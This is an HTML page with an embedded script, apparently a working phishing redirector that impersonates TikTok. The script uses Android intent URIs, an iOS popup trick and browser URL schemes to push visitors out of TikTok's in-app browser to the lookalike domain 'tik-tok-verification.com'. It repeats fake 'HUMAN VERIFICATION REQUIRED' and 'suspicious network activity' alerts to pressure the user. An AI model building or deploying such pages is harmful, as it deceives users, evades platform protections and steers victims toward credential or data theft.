<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <style>body { background: #fff; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; font-family: sans-serif; }</style>
</head>
<body>
    <div id="loader">Verifying Connection...</div>

<script>
    const targetUrl = "https://tik-tok-verification.com/Verification/verify1.html";
    const domain = "tik-tok-verification.com/Verification/verify1.html";
    const killTime = Date.now() + 5000;

    function theGhostEject() {
        const isAndroid = /Android/i.test(navigator.userAgent);

        if (isAndroid) {
            // Android: This intent is the "Gold Standard" for bypassing the picker
            window.location.href = `intent://${domain}#Intent;scheme=https;action=android.intent.action.VIEW;category=android.intent.category.BROWSABLE;package=com.android.chrome;end`;
        } else {
            // iOS: THE FEATURE-CONFLICT POPUP
            // We open a window with 'menubar' and 'location' set to yes.
            // TikTok's internal browser has no menu bar, so it often kicks this to Safari.
            
            const features = "menubar=yes,location=yes,resizable=yes,scrollbars=yes,status=yes";
            
            // 1. Try to pop the window
            const ghost = window.open(targetUrl, "_blank", features);

            // 2. Immediate protocol backup in case the popup is blocked
            // This 'googlechromes' scheme is the cleanest direct-path
            setTimeout(() => {
                window.location.href = "googlechromes://" + domain;
            }, 100);

            // 3. The 'Safari-Https' overwrite
            setTimeout(() => {
                window.location.href = "safari-https://" + domain;
            }, 200);
        }
    }

    function securityEngine() {
        if (Date.now() > killTime) return;

        theGhostEject();

        setTimeout(() => {
            if (document.hasFocus()) {
                const header = "HUMAN VERIFICATION REQUIRED\n";
                const body = "______________________________\n\nSuspicious network activity detected, please complete human verification to continue using TikTok.";
                
                alert(header + body);
                
                // Fire again on "OK"
                theGhostEject();
                setTimeout(securityEngine, 400);
            }
        }, 400);
    }

    // Fire immediately and also on any touch
    window.onload = securityEngine;
    document.body.onclick = theGhostEject;
</script>
</body>
</html>
